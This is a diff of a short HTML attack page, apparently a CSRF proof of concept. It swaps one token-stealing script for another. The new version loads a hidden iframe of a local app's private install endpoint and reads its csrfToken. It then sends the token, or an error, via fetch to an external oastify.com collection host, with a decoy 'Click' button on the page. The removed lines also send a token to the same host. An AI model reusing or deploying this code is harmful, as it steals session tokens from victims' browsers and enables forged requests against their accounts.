@@ -1,21 +1,20 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h3>CSRF Check – Stage 1</h3>
+    <h3>CSRF Token Steal via iframe</h3>
+
+    <iframe src="http://localhost:3000/apiv1/private/install" id="internal" style="display:none;"></iframe>
 
     <script>
-      window.onload = () => {
-        setTimeout(() => {
-          const tokenInput = document.querySelector('[name="csrfToken"]');
-          if (tokenInput && tokenInput.value) {
-            // CSRF token found, send it
-            fetch("https://8aje7zfbsbe4i0w0z824l5tcb3hu5mtb.oastify.com/csrf?token=" + encodeURIComponent(tokenInput.value));
-          } else {
-            // Token not found
-            fetch("https://8aje7zfbsbe4i0w0z824l5tcb3hu5mtb.oastify.com/csrf?error=no-token-present");
-          }
-        }, 500);
-      };
+      setTimeout(() => {
+        try {
+          const doc = document.getElementById("internal").contentWindow.document;
+          const token = doc.querySelector('[name="csrfToken"]').value;
+          fetch("https://8aje7zfbsbe4i0w0z824l5tcb3hu5mtb.oastify.com/csrf?token=" + encodeURIComponent(token));
+        } catch (e) {
+          fetch("https://8aje7zfbsbe4i0w0z824l5tcb3hu5mtb.oastify.com/csrf?error=iframe_fail");
+        }
+      }, 1500);
     </script>
 
     <button id="installbutton">Click</button>
